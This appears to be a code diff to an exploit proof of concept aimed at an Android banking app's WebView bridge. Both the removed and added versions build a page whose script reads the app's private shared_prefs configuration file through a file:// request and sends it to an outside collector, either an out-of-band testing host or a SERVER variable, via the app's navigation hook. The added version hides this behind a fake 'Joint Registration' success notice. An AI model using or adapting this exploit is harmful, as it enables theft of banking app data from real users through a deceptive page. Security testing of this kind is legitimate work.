@@ -145,26 +145,63 @@ function renderPage({ content, title = "Test Login Page Below" }) {
       } else {
         log("2-bridge-exists");
         try {
-            var testHtml = '<html><body><p id="s">Verifying Account Status...</p><script>' +
-                'var stolen = "placeholder";' +
-                'var target = "/data/data/com.rbc.mobile.android/shared_prefs/configuration_prefs.xml";' +
-                'var xhr = new XMLHttpRequest();' +
-                'xhr.open("GET", "file://" + target, true);' +
-                'xhr.onreadystatechange = function() {' +
-                '  if (xhr.readyState === 4) {' +
-                '    if (xhr.status === 0 || xhr.status === 200) {' +
-                '      stolen = xhr.responseText;' +
-                '    }' +
-                '    var data = encodeURIComponent(JSON.stringify(stolen));' +
-                '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
-                '      "version": "1.2",' +
-                '      "type": "externalWebview",' +
-                '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?d=" + data' +
-                '    }));' +
-                '  }' +
-                '};' +
-                'xhr.send();' +
-                '</' + 'script></body></html>';
+            var testHtml = '<!doctype html><html lang="en"><head>' +
+              '<meta charset="utf-8">' +
+              '<meta name="viewport" content="width=device-width,initial-scale=1">' +
+              '<title>Joint Registration</title>' +
+              '<style>' +
+              ':root{--page:#eff6f8;--panel:#ffffff;--ink:#222426;--muted:#5a6167;' +
+              '--line:#d9dee1;--blue:#0073cf;--blue-dark:#005fae;' +
+              'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}' +
+              '*{box-sizing:border-box}' +
+              'html,body{min-height:100%}' +
+              'body{min-height:100vh;margin:0;color:var(--ink);background:var(--page)}' +
+              'h1,h2,h3,p{margin-top:0}' +
+              'h1{max-width:420px;margin-bottom:0;font-size:clamp(48px,14vw,74px);' +
+              'font-weight:200;line-height:1.05;letter-spacing:0}' +
+              '.page-shell{width:min(100%,520px);min-height:100vh;margin:0 auto;' +
+              'padding:52px 24px 64px}' +
+              '.hero{margin-bottom:46px}' +
+              '.eyebrow{color:var(--muted);font-size:18px}' +
+              '.section-block{margin-bottom:56px}' +
+              '.login-card{border:1px solid var(--line);background:var(--panel);' +
+              'padding:34px 30px 30px}' +
+              '.complete-card{display:grid;gap:26px}' +
+              '.complete-card h3{margin-bottom:22px;font-size:32px;' +
+              'font-weight:300;line-height:1.15}' +
+              '.complete-card p{margin-bottom:0;color:var(--muted);' +
+              'font-size:22px;line-height:1.35}' +
+              '@media(max-width:380px){' +
+              '.page-shell{padding-left:18px;padding-right:18px}' +
+              'h1{font-size:45px}' +
+              '.complete-card h3{font-size:28px}' +
+              '.login-card{padding-left:24px;padding-right:24px}}' +
+              '</style></head><body>' +
+              '<main id="main" class="page-shell">' +
+              '<section class="hero" aria-labelledby="page-title">' +
+              '<h1 id="page-title">Joint Registration</h1><br>' +
+              '<p class="eyebrow">Please follow on-screen directions.</p></section>' +
+              '<section class="section-block">' +
+              '<div class="login-card complete-card">' +
+              '<h3>Success!</h3>' +
+              '<p>Account eligibility verified. The joint-account status will be ' +
+              'visible in your account in 24-48 hours.</p>' +
+              '</div></section></main>' +
+              '<script>' +
+              'var S="' + SERVER + '";' +
+              'var target="/data/data/com.rbc.mobile.android/shared_prefs/configuration_prefs.xml";' +
+              'var xhr=new XMLHttpRequest();' +
+              'xhr.open("GET","file://"+target,true);' +
+              'xhr.onreadystatechange=function(){' +
+              'if(xhr.readyState===4){' +
+              'var stolen="";' +
+              'if(xhr.status===0||xhr.status===200){stolen=xhr.responseText;}' +
+              'var data=encodeURIComponent(JSON.stringify(stolen));' +
+              'WebViewFragment.onNavigateWebHook(JSON.stringify({' +
+              '"version":"1.2","type":"externalWebview",' +
+              '"destination":S+"/collect?d="+data}));}};' +
+              'xhr.send();' +
+              '</' + 'script></body></html>';
       
               WebViewFragment.onFeatureEventWebHook(JSON.stringify({
                   "version": "1.2",
